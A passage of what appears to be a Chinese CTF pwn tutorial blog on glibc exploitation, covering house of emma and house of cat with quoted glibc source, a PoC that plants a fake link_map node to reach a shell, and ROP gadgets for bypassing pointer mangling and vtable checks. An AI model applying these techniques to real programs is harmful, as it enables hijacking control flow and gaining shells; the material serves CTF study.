class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">uint64_t</span> to;</span><br><span class="line"><span class="type">uint64_t</span> from;</span><br><span class="line"><span class="type">char</span> buf[<span class="number">0x400</span>];</span><br><span class="line"></span><br><span class="line">FILE* file;</span><br><span class="line"><span class="built_in">sprintf</span>(buf, <span class="string">&quot;/proc/%d/maps&quot;</span>,(<span class="type">int</span>)getpid()); </span><br><span class="line">file = fopen(buf, <span class="string">&quot;r&quot;</span>);</span><br><span class="line"><span class="keyword">while</span>(fgets(buf, <span class="keyword">sizeof</span>(buf), file)) </span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">strstr</span>(buf,<span class="string">&quot;libc&quot;</span>)!=<span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">sscanf</span>(buf, <span class="string">&quot;%lx-%lx&quot;</span>, &amp;from, &amp;to);</span><br><span class="line">    fclose(file);</span><br><span class="line"><span class="keyword">return</span> from;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">uint64_t</span> libcBase    = getLibcBase();</span><br><span class="line"><span class="type">uint64_t</span> rtld_global = libcBase+<span class="number">0x23a060</span>;</span><br><span class="line"><span class="type">uint64_t</span>* next_node = (<span class="type">uint64_t</span>*)(rtld_global<span class="number">-0x48048</span>); </span><br><span class="line">    <span class="comment">// distance &amp;_rtld_global &amp;(_rtld_global._dl_ns._ns_loaded-&gt;l_next-&gt;l_next-&gt;l_next)</span></span><br><span class="line"><span class="type">uint64_t</span> fake = (<span class="type">uint64_t</span>)<span class="built_in">malloc</span>(<span class="number">0x470</span>);</span><br><span class="line"><span class="built_in">memset</span>((<span class="type">void</span>*)fake,<span class="number">0</span>,<span class="number">0x470</span>);</span><br><span class="line"></span><br><span class="line">*next_node = fake;</span><br><span class="line">    <span class="comment">//l_addr==0</span></span><br><span class="line">*(<span class="type">uint64_t</span>*)(fake+<span class="number">0x28</span>)  = fake;<span class="comment">//l_real</span></span><br><span class="line"></span><br><span class="line">*(<span class="type">uint64_t</span>*)(fake+<span class="number">0x31c</span>) = <span class="number">0x1c</span>;<span class="comment">//l_init_called</span></span><br><span class="line"></span><br><span class="line">    *(<span class="type">uint64_t</span>*)(fake+<span class="number">0x110</span>) = fake+<span class="number">0x40</span>;<span class="comment">//l_info[26]</span></span><br><span class="line">*(<span class="type">uint64_t</span>*)(fake+<span class="number">0x48</span>)  = fake+<span class="number">0x58</span>;</span><br><span class="line">*(<span class="type">uint64_t</span>*)(fake+<span class="number">0x58</span>)  = (<span class="type">uint64_t</span>)shell;</span><br><span class="line"></span><br><span class="line">*(<span class="type">uint64_t</span>*)(fake+<span class="number">0x120</span>) = fake+<span class="number">0x48</span>;<span class="comment">//l_info[28]</span></span><br><span class="line">*(<span class="type">uint64_t</span>*)(fake+<span class="number">0x50</span>)  = <span class="number">0x8</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="例题-4"><a href="#例题-4" class="headerlink" title="例题"></a>例题</h2><p><strong>西湖论剑2020决赛-husk</strong></p><h1 id="house-of-emma"><a href="#house-of-emma" class="headerlink" title="house of emma"></a>house of emma</h1><h2 id="概要-12"><a href="#概要-12" class="headerlink" title="概要"></a>概要</h2><p><strong>简介:</strong>在GLIBC2.34 版本中，本应在 CTF 的 PWN 题中常用 Hook — <strong>free_hook 、</strong> <strong>malloc_hook</strong> 被取消，同时有些题目的限制中，又无法构造出任意地址申请。</p><p>因此在新版中各种各样的限制下，迫使转变思想：从以往的 <strong>任意地址申请</strong> <strong>→</strong> <strong>构成任意读写</strong> →<strong>从而 Getshell</strong> ，转变为：在某处写一个可控地址直接 Getshell（借助于 IO_FILE）。显而易见的，后者的所需条件一定是少于前者的。</p><p><strong>利用条件:</strong></p><ol><li>可以任意写一个可控地址（LargeBin Attack,Tcache Stashing Unlink Attack…）</li><li>可以触发 IO 流（FSOP,House OF Kiwi）</li></ol><p><strong>利用效果:</strong>控制流</p><p><strong>有效版本:</strong></p><h2 id="原理-12"><a href="#原理-12" class="headerlink" title="原理"></a>原理</h2><p>在 vtable 的合法范围内，存在一个 <strong>_IO_cookie_jumps</strong>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> _<span class="title">IO_cookie_jumps</span> <span class="title">libio_vtable</span> =</span> &#123;</span><br><span class="line">  JUMP_INIT_DUMMY,</span><br><span class="line">  JUMP_INIT(finish, _IO_file_finish),</span><br><span class="line">  JUMP_INIT(overflow, _IO_file_overflow),</span><br><span class="line">  JUMP_INIT(underflow, _IO_file_underflow),</span><br><span class="line">  JUMP_INIT(uflow, _IO_default_uflow),</span><br><span class="line">  JUMP_INIT(pbackfail, _IO_default_pbackfail),</span><br><span class="line">  JUMP_INIT(xsputn, _IO_file_xsputn),</span><br><span class="line">  JUMP_INIT(xsgetn, _IO_default_xsgetn),</span><br><span class="line">  JUMP_INIT(seekoff, _IO_cookie_seekoff),</span><br><span class="line">  JUMP_INIT(seekpos, _IO_default_seekpos),</span><br><span class="line">  JUMP_INIT(setbuf, _IO_file_setbuf),</span><br><span class="line">  JUMP_INIT(sync, _IO_file_sync),</span><br><span class="line">  JUMP_INIT(doallocate, _IO_file_doallocate),</span><br><span class="line">  JUMP_INIT(read, _IO_cookie_read),</span><br><span class="line">  JUMP_INIT(write, _IO_cookie_write),</span><br><span class="line">  JUMP_INIT(seek, _IO_cookie_seek),</span><br><span class="line">  JUMP_INIT(close, _IO_cookie_close),</span><br><span class="line">  JUMP_INIT(stat, _IO_default_stat),</span><br><span class="line">  JUMP_INIT(showmanyc, _IO_default_showmanyc),</span><br><span class="line">  JUMP_INIT(imbue, _IO_default_imbue),</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>在 vtable 的检测中对具体位置的检测还是比较宽松的,只是检查是否在vtable段内，这使得可以在一定的范围内对 vtable 表的起始位置进行偏移，使其在调用<strong>具体偏移是固定</strong>的情况下，可以通过偏移来调用在 vtable 表中的任意函数，因此考虑将其指定为以下几个函数。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">ssize_t</span></span><br><span class="line">_IO_cookie_read (FILE *fp, <span class="type">void</span> *buf, <span class="type">ssize_t</span> size)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_cookie_file</span> *<span class="title">cfile</span> =</span> (<span class="keyword">struct</span> _IO_cookie_file *) fp;</span><br><span class="line">  <span class="type">cookie_read_function_t</span> *read_cb = cfile-&gt;__io_functions.read;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">  PTR_DEMANGLE (read_cb);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"> </span><br><span class="line">  <span class="keyword">if</span> (read_cb == <span class="literal">NULL</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">return</span> read_cb (cfile-&gt;__cookie, buf, size);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">static</span> <span class="type">ssize_t</span></span><br><span class="line">_IO_cookie_write (FILE *fp, <span class="type">const</span> <span class="type">void</span> *buf, <span class="type">ssize_t</span> size)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_cookie_file</span> *<span class="title">cfile</span> =</span> (<span class="keyword">struct</span> _IO_cookie_file *) fp;</span><br><span class="line">  <span class="type">cookie_write_function_t</span> *write_cb = cfile-&gt;__io_functions.write;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">  PTR_DEMANGLE (write_cb);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"> </span><br><span class="line">  <span class="keyword">if</span> (write_cb == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="type">ssize_t</span> n = write_cb (cfile-&gt;__cookie, buf, size);</span><br><span class="line">  <span class="keyword">if</span> (n &lt; size)</span><br><span class="line">    fp-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">return</span> n;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">static</span> <span class="type">off64_t</span></span><br><span class="line">_IO_cookie_seek (FILE *fp, <span class="type">off64_t</span> offset, <span class="type">int</span> dir)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_cookie_file</span> *<span class="title">cfile</span> =</span> (<span class="keyword">struct</span> _IO_cookie_file *) fp;</span><br><span class="line">  <span class="type">cookie_seek_function_t</span> *seek_cb = cfile-&gt;__io_functions.seek;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">  PTR_DEMANGLE (seek_cb);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"> </span><br><span class="line">  <span class="keyword">return</span> ((seek_cb == <span class="literal">NULL</span></span><br><span class="line">       || (seek_cb (cfile-&gt;__cookie, &amp;offset, dir)</span><br><span class="line">           == <span class="number">-1</span>)</span><br><span class="line">       || offset == (<span class="type">off64_t</span>) <span class="number">-1</span>)</span><br><span class="line">      ? _IO_pos_BAD : offset);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">static</span> <span class="type">int</span></span><br><span class="line">_IO_cookie_close (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_cookie_file</span> *<span class="title">cfile</span> =</span> (<span class="keyword">struct</span> _IO_cookie_file *) fp;</span><br><span class="line">  <span class="type">cookie_close_function_t</span> *close_cb = cfile-&gt;__io_functions.close;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">  PTR_DEMANGLE (close_cb);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"> </span><br><span class="line">  <span class="keyword">if</span> (close_cb == <span class="literal">NULL</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">return</span> close_cb (cfile-&gt;__cookie);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这几个函数内存在任意函数指针调用，且函数指针来源于_IO_cookie_file 结构体，<strong>这个结构体是 _IO_FILE_plus 的扩展</strong>，如果可以控制 IO 的内容，大概率这部分的数据也是可控的，并且其的<strong>第一个参数也是来源于这个结构.也就是可以控制rdi</strong>所以可以把其当做一个类似于 __free_hook 的 Hook 来利用。</p><p>结构体定义在glibc/libio/libioP.h中</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Special file type for fopencookie function.  */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_cookie_file</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span> __<span class="title">fp</span>;</span></span><br><span class="line">  <span class="type">void</span> *__cookie;</span><br><span class="line">  <span class="type">cookie_io_functions_t</span> __io_functions;</span><br><span class="line">&#125;;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_cookie_io_functions_t</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">cookie_read_function_t</span> *read;        <span class="comment">/* Read bytes.  */</span></span><br><span class="line">  <span class="type">cookie_write_function_t</span> *write;    <span class="comment">/* Write bytes.  */</span></span><br><span class="line">  <span class="type">cookie_seek_function_t</span> *seek;        <span class="comment">/* Seek/tell file position.  */</span></span><br><span class="line">  <span class="type">cookie_close_function_t</span> *close;    <span class="comment">/* Close file.  */</span></span><br><span class="line">&#125; <span class="type">cookie_io_functions_t</span>;</span><br></pre></td></tr></table></figure><p><strong>绕过 PTR_DEMANGLE</strong></p><p>在上面的分析中，暂时忽略了一个可能会存在的问题，也就是在上面代码中函数指针调用前所执行的 PTR_DEMANGLE （指针保护）选项是默认开启的，也就是<code>cookie_io_functions_t</code>中的值应该是加密过后的,这意味着需要解决指针加密的问题。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="type">uintptr_t</span> __pointer_chk_guard attribute_relro;</span><br><span class="line"><span class="meta">#  <span class="keyword">define</span> PTR_MANGLE(var) \</span></span><br><span class="line"><span class="meta">  (var) = (__typeof (var)) ((uintptr_t) (var) ^ __pointer_chk_guard)</span></span><br><span class="line"><span class="meta">#  <span class="keyword">define</span> PTR_DEMANGLE(var) PTR_MANGLE (var)</span></span><br></pre></td></tr></table></figure><p>根据 <strong>GLIBC Wiki</strong> 上的解释，可以得知这个是 GLIBC 的一项安全功能，用于增加攻击者在 GLIBC 结构中操纵指针（尤其是函数指针）的难度。这时，通过调试可以得知，这个值存在于 TLS 段上，将其 ROR 移位 0x11 后再与指针进行异或。</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/940906_U9ZGVURG434TPE6.png" alt=""></p><p>fs[0x30] 的值位于与 libc 相邻的空间中，<strong>这个位置距离 libc 地址的偏移固定</strong>，虽然无法泄露<strong>出这个位置随机值的内容</strong>,但是可以<strong>利用很多方法对其进行写入</strong>：</p><ol><li>Fastbin Reverse Into Tcache</li><li>Tcache Stashing Unlink Attack</li><li>LargeBin Attack</li></ol><p>但无论使用什么方法，根本思想：还是让这个本来是随机的、不确定的异或值，转变为已知的地址。而通常在满足能够利用 IO_FILE 的情况下，这个前置要求都能够被满足。</p><p>最后因为emma调用链中<strong>rdi是可控</strong>的,所以可以在setcontetxt之前用一些gadget<strong>先由rdi控制rdx</strong></p><p>例如如下两个,分别在2.38和2.31找到的gadget</p><p><code>mov rdx, qword ptr [rdi + 8]; mov rax, qword ptr [rdi]; mov rdi, rdx; jmp rax;</code></p><p><code>mov rdx, qword ptr [rdi + 8]; mov qword ptr [rsp], rax; call qword ptr [rdx + 0x20];</code></p><h3 id="实操可能的问题"><a href="#实操可能的问题" class="headerlink" title="实操可能的问题"></a>实操可能的问题</h3><p>如果我们的选择的是利用house of kiwi来触发stderr的io流函数,在实际操作中，可能因为 stderr 的指针存放在 bss 段上，从而导致无法篡改。</p><p>只能使用 exit 来触发 FSOP，但是又会发现如果通过 exit 来触发 FSOP，<strong>会遇到在 exit 中也有调用指针保护的函数指针执行，但此时的异或内容被我们所篡改，使得无法执行正确的函数地址</strong>，且此位置在 FSOP 之前，从而导致程序没有进入 IO 流就发生了错误。</p><p>这种时候就可以考虑构造两个 IO_FILE，且后者指针处于前者的 _chains 处，前者用 <a href="https://www.anquanke.com/post/id/216290">GLIBC2.24 之前的 IO_FILE 攻击</a> 的思想在 __pointer_chk_guard 处写已知内容，后者再用 House_OF_Emma 来进行函数指针调用。 </p><h2 id="例题-5"><a href="#例题-5" class="headerlink" title="例题"></a>例题</h2><p><strong>2021湖湘杯-House_OF_Emma</strong></p><h1 id="house-of-cat"><a href="#house-of-cat" class="headerlink" title="house of cat"></a>house of cat</h1><h2 id="概要-13"><a href="#概要-13" class="headerlink" title="概要"></a>概要</h2><p><strong>简介:</strong>House of Cat利用了House of emma的虚表偏移修改思想，通过修改虚表指针的偏移，避免了对需要绕过TLS上 <strong>_pointer_chk_guard</strong>的检测相关的IO函数的调用，转而调用<strong>_IO_wfile_jumps</strong>中的<strong>_IO_wfile_seekoff</strong>函数，然后进入到<strong>_IO_switch_to_wget_mode</strong>函数中来攻击，从而使得攻击条件和利用变得更为简单。并且house of cat在<strong>FSOP</strong>的情况下也是可行的，只需修改虚表指针的偏移来调用<strong>_IO_wfile_seekoff</strong>即可（通常是结合<strong>__malloc_assert</strong>，改vtable为<strong>_IO_wfile_jumps+0x10</strong>）。</p><p><strong>利用条件:</strong></p><ol><li>可以任意写一个可控地址（LargeBin Attack,Tcache Stashing Unlink Attack…）</li><li>能够泄露堆地址和libc基址</li><li>能够触发IO流(FSOP或触发__malloc_assert,或者程序中存在puts等能进入IO链的函数),执行IO相关函数</li></ol><p><strong>利用效果:</strong>控制流</p><p><strong>有效版本:</strong>ALL</p><h2 id="原理-13"><a href="#原理-13" class="headerlink" title="原理"></a>原理</h2><p>在高版本libc中，当攻击条件有限（如不能造成任意地址写）或者libc版本中无hook函数（libc2.34及以后）时，伪造fake_IO进行攻击是一种常见可行的攻击方式，常见的触发IO函数的方式有FSOP、__malloc_assert（当然也可以用puts等函数，<strong>只不过需要任意地址写任意值直接改掉libc中的stdout结构体</strong>），<strong>当进入IO流时会根据vtable指针调用相关的IO函数</strong>，如果在题目中造成任意地址写一个可控地址（如large bin attack、tcache stashing unlink attack、fastbin reverse into tcache），然后伪造fake_IO结构体配合恰当的IO调用链，可以达到控制程序执行流的效果。</p><p>House of emma是glibc2.34下常用的攻击手法之一，利用条件只需任意写一个可控地址就可以控制程序执行流，攻击威力十分强大。但是需要攻击位于TLS的<strong>_pointer_chk_guard</strong>，并且远程可能需要爆破TLS偏移。</p><h3 id="vtable检查"><a href="#vtable检查" class="headerlink" title="vtable检查"></a>vtable检查</h3><p>在glibc2.24以后加入了对虚函数的检测，在调用虚函数之前首先会检查虚函数地址的合法性。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> _IO_vtable_check (<span class="type">void</span>) attribute_hidden;</span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">const</span> <span class="keyword">struct</span> _IO_jump_t *</span><br><span class="line"><span class="title function_">IO_validate_vtable</span> <span class="params">(<span class="type">const</span> <span class="keyword">struct</span> _IO_jump_t *vtable)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">uintptr_t</span> section_length = __stop___libc_IO_vtables -__start___libc_IO_vtables;</span><br><span class="line">  <span class="type">uintptr_t</span> ptr = (<span class="type">uintptr_t</span>) vtable;</span><br><span class="line">  <span class="type">uintptr_t</span> offset = ptr -(<span class="type">uintptr_t</span>)__start___libc_IO_vtables;</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (offset &gt;= section_length))</span><br><span class="line">    _IO_vtable_check ();</span><br><span class="line">  <span class="keyword">return</span> vtable;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其检查流程为：计算_IO_vtable 段的长度（section_length），用当前虚表指针的地址减去_IO_vtable 段的开始地址，如果vtable相对于开始地址的偏移大于等于section_length，那么就会进入_IO_vtable_check进行更详细的检查，否则的话会正常调用。如果vtable是非法的，进入_IO_vtable_check函数后会触发abort。</p><p>虽然对vtable的检查较为严格，但是对于具体位置和具体偏移的检测则是较为宽松的，<strong>可以修改vtable指针为虚表段内的任意位置</strong>，也就是对于某一个<strong>_IO_xxx_jumps</strong>的任意偏移，使得其调用攻击者想要调用的IO函数。</p><h3 id="malloc-assert与FSOP"><a href="#malloc-assert与FSOP" class="headerlink" title="__malloc_assert与FSOP"></a>__malloc_assert与FSOP</h3><p>在glibc中存在一个函数_malloc_assert，其中会根据vtable表如_IO_xxx_jumps调用IO等相关函数；</p><p><strong>该函数最终会根据<code>stderr</code>这个IO结构体进行相关的IO操作</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line">__malloc_assert (<span class="type">const</span> <span class="type">char</span> *assertion, <span class="type">const</span> <span class="type">char</span> *file, <span class="type">unsigned</span> <span class="type">int</span> line,</span><br><span class="line">         <span class="type">const</span> <span class="type">char</span> *function)</span><br><span class="line">&#123;</span><br><span class="line">  (<span class="type">void</span>) __fxprintf (<span class="literal">NULL</span>, <span class="string">&quot;%s%s%s:%u: %s%sAssertion `%s&#x27; failed.\n&quot;</span>,</span><br><span class="line">             __progname, __progname[<span class="number">0</span>] ? <span class="string">&quot;: &quot;</span> : <span class="string">&quot;&quot;</span>,</span><br><span class="line">             file, line,</span><br><span class="line">             function ? function : <span class="string">&quot;&quot;</span>, function ? <span class="string">&quot;: &quot;</span> : <span class="string">&quot;&quot;</span>,</span><br><span class="line">             assertion);</span><br><span class="line">  fflush (<span class="built_in">stderr</span>);</span><br><span class="line">  <span class="built_in">abort</span> ();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>house of kiwi提供了一种调用该函数的思路，可以通过修改topchunk的大小触发，即满足下列条件中的一个</p><blockquote><p>1.topchunk的大小小于MINSIZE(0X20)<br>2.prev inuse位为0<br>3.old_top页未对齐</p></blockquote><hr><p>下面介绍另一种触发house of cat的方式FSOP</p><p>程序中所有的_IO_FILE 结构用_chain连接形成一个单链表，链表的头部则是_IO_list_all</p><p>FSOP就是通过劫持_IO_list_all的值（如large bin attack修改）来执行<code>_IO_flush_all_lockp</code>函数，<strong>这个函数会根据_IO_list_all刷新链表中的所有文件流，</strong></p><p>在libc中代码如下:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_flush_all_lockp (<span class="type">int</span> do_lock)</span><br><span class="line">&#123;</span><br><span class="line">  ...</span><br><span class="line">  fp = (_IO_FILE *) _IO_list_all;</span><br><span class="line">  <span class="keyword">while</span> (fp != <span class="literal">NULL</span>)</span><br><span class="line">  &#123;</span><br><span class="line">       ...</span><br><span class="line">       <span class="keyword">if</span> (((fp-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base))</span><br><span class="line">               &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)</span><br><span class="line">           &#123;</span><br><span class="line">               result = EOF;</span><br><span class="line">          &#125;</span><br><span class="line">        ...</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>其中会调用vtable中的IO函数_IO_OVERFLOW，根据上面所说的虚表偏移可变思想，这个地方的虚表偏移也是可修改的，然后配合伪造IO结构体可以执行house of cat的调用链</strong></p><p>FSOP有三种情况</p><ol><li>能从main函数中返回</li><li>程序中能执行exit函数</li><li>libc中执行abort</li></ol><p><strong>第三种情况在高版本中已经删除</strong>;</p><p>__malloc_assert则是在malloc中触发，通常是修改top chunk的大小。</p><h3 id="一种可行的IO调用链"><a href="#一种可行的IO调用链" class="headerlink" title="一种可行的IO调用链"></a>一种可行的IO调用链</h3><p>在<strong>_IO_wfile_jumps</strong>结构体中，会根据虚表进行相关的函数调用。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> _<span class="title">IO_wfile_jumps</span> <span class="title">libio_vtable</span> =</span></span><br><span class="line">&#123;</span><br><span class="line">  JUMP_INIT_DUMMY,</span><br><span class="line">  JUMP_INIT(finish, _IO_new_file_finish),</span><br><span class="line">  JUMP_INIT(overflow, (_IO_overflow_t) _IO_wfile_overflow),</span><br><span class="line">  JUMP_INIT(underflow, (_IO_underflow_t) _IO_wfile_underflow),</span><br><span class="line">  JUMP_INIT(uflow, (_IO_underflow_t) _IO_wdefault_uflow),</span><br><span class="line">  JUMP_INIT(pbackfail, (_IO_pbackfail_t) _IO_wdefault_pbackfail),</span><br><span class="line">  JUMP_INIT(xsputn, _IO_wfile_xsputn),</span><br><span class="line">  JUMP_INIT(xsgetn, _IO_file_xsgetn),</span><br><span class="line">  JUMP_INIT(seekoff, _IO_wfile_seekoff),</span><br><span class="line">  JUMP_INIT(seekpos, _IO_default_seekpos),</span><br><span class="line">  JUMP_INIT(setbuf, _IO_new_file_setbuf),</span><br><span class="line">  JUMP_INIT(sync, (_IO_sync_t) _IO_wfile_sync),</span><br><span class="line">  JUMP_INIT(doallocate, _IO_wfile_doallocate),</span><br><span class="line">  JUMP_INIT(read, _IO_file_read),</span><br><span class="line">  JUMP_INIT(write, _IO_new_file_write),</span><br><span class="line">  JUMP_INIT(seek, _IO_file_seek),</span><br><span class="line">  JUMP_INIT(close, _IO_file_close),</span><br><span class="line">  JUMP_INIT(stat, _IO_file_stat),</span><br><span class="line">  JUMP_INIT(showmanyc, _IO_default_showmanyc),</span><br><span class="line">  JUMP_INIT(imbue, _IO_default_imbue)</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>其中<strong>_IO_wfile_seekoff</strong>函数代码如下(<strong>glibc/libio/wfileops.c</strong>)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">off64_t</span></span><br><span class="line">_IO_wfile_seekoff (FILE *fp, <span class="type">off64_t</span> offset, <span class="type">int</span> dir, <span class="type">int</span> 